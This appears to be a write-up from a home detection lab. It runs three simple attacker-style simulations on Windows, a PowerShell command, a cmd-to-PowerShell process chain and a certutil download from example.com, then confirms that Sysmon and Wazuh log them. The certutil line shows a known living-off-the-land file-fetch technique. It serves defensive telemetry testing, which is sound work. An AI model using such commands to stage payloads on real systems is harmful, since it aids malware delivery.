# Attack Simulation

## Objective

To simulate realistic attacker behaviours based on defined threat scenarios and validate whether the configured telemetry captures the activity.

---

## Simulation 1: PowerShell Execution

### Description

PowerShell was executed to simulate command-based activity commonly observed in attacker behaviour.

### Command Used

```powershell
powershell.exe -Command "Get-Process"
```

### Expected Behaviour

- Sysmon generates Event ID 1
- Process creation is recorded with command-line details

### Evidence

[![PowerShell Execution](../assets/screenshots/powershell-execution.png)](../assets/screenshots/powershell-execution.png)

---

## Simulation 2: Suspicious Process Chain

### Description

A command shell was used to launch PowerShell, creating a parent-child process chain.

### Command Used

```powershell
cmd.exe /c powershell.exe
```

### Expected Behaviour

- Sysmon logs process creation
- Parent process: `cmd.exe`
- Child process: `powershell.exe`

### Evidence

[![Process Chain cmd to PowerShell](../assets/screenshots/process-chain.png)](../assets/screenshots/process-chain.png)

---

## Simulation 3: certutil Abuse

### Description

certutil was used to simulate Living Off the Land behaviour commonly associated with file transfer or payload staging.

### Command Used

```powershell
certutil.exe -urlcache -split -f http://example.com file.txt
```

### Expected Behaviour

- Sysmon logs execution of `certutil.exe`
- Command-line arguments are visible in the event

### Evidence

[![certutil Activity](../assets/screenshots/certutil-activity.png)](../assets/screenshots/certutil-activity.png)

---

## Observation Points

### Endpoint (Sysmon)

Event Viewer:  
Applications and Services Logs → Microsoft → Windows → Sysmon → Operational

### SIEM (Wazuh)

```bash
sudo tail -f /var/ossec/logs/alerts/alerts.log
```

---

## Outcome

All simulated behaviours were successfully executed and captured by Sysmon as process creation events.

The generated telemetry confirms visibility of:

- direct command execution
- chained process behaviour
- use of native Windows utilities (LOLBins)

This demonstrates that the lab environment is capable of capturing meaningful endpoint activity required for detection and analysis.

These results provide a strong foundation for detection tuning and validation in subsequent phases.
